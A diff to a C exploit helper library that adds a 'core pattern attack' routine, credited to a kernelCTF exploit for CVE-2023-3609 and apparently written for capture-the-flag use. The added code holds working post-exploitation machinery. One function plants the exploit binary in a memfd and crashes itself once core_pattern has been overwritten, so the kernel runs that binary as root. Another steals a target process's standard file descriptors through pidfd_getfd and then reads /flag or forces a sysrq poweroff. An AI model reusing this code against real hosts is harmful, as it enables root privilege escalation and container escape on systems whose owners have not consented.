@@ -817,3 +817,73 @@ static void __attribute__((constructor)) init(void){
     optmem_max = fread_u64(OPTMEM_MAX_FILE);
     // libxInit();
 }
+
+// Core pattern Attack
+/*
+ * - Based on Billy's kernelctf Exploitation (CVE-2023-3609)
+ */
+// Example:
+// int main(int argc, char *argv[]){
+//     COREHEAD(argv);
+//     // Exp Start
+//     // .. Attack to midify the /proc/sys/kernel/core_pattern to 
+//     // "|/proc/%P/fd/<crash_arg>"
+//     // For example, outside the docker container we run: echo "/proc/%P/fd/666" | sudo tee /proc/sys/kernel/core_pattern
+//     CORETAIL(666);
+// }
+
+#define SYS_pidfd_getfd 438
+int pidofn132(){
+	char buf[0x100];
+	// Target process is the process that we want to get a root shell/flag
+	FILE* fp = popen("pidof n132","r");
+	fread(buf,1,0x100,fp);
+	fclose(fp);
+	int pid = strtoull(buf,0,10);
+	return pid;
+}
+void coreShell(int reboot){
+	// Use when core_pattern was modified:
+	// /proc/sys/kernel/core_pattern <- "|/proc/%P/fd/666"
+    char buf[0x100] = {};
+    FILE* fp = popen("pidof n132","r");
+	fread(buf,1,0x100,fp);
+	fclose(fp);
+	int pid         = strtoull(buf,0,10);
+	int pfd 		= syscall(SYS_pidfd_open,pid,0);
+	int stdinfd 	= syscall(SYS_pidfd_getfd, pfd, 0, 0);
+	int stdoutfd 	= syscall(SYS_pidfd_getfd, pfd, 1, 0);
+	int stderrfd 	= syscall(SYS_pidfd_getfd, pfd, 2, 0);
+	dup2(stdinfd	,0);
+	dup2(stdoutfd	,1);
+	dup2(stderrfd	,2);
+	if(reboot==0)
+		system("cat /flag;ls /home/n132");
+	else
+		system("cat /flag;echo o>/proc/sysrq-trigger;");
+}
+
+void crash(int fd)
+{
+    int memfd = memfd_create("", 0);
+    sendfile(memfd, open("main", 0), 0, 0xffffffff);
+    dup2(memfd,fd);
+    close(memfd);
+    char dst[0x100] = {};
+    snprintf(dst,sizeof(dst),"|/proc/%%P/fd/%d",fd);
+    while (1)
+    {
+        // Check if /proc/sys/kernel/core_pattern has been overwritten
+        char buf[0x100] = {};
+        int core = open("/proc/sys/kernel/core_pattern", 0);
+        read(core, buf, sizeof(buf));
+        close(core);
+        if(strncmp(buf, dst, strlen(dst)) == 0)
+            *(size_t *)0 = 0;
+        sleep(1);
+    }
+    
+}
+
+
+
